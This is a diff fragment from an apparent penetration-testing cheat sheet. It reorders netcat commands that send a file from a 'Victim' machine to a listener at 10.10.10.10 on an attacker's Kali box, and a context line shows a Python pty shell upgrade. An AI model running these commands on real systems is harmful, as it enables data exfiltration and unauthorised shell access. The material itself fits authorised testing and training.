@@ -31,9 +31,9 @@ Victim: ```python3 -c 'import pty; pty.spawn("/bin/sh")'```
 
 ### With netcat
 
-Kali:   ```nc -lvp 4444 > file.txt```
-
 Victim: ```cat file.txt | nc -q 0 10.10.10.10 4444```
+
+Kali:   ```nc -lvp 4444 > file.txt```
 
 ## Reverse shells 
 
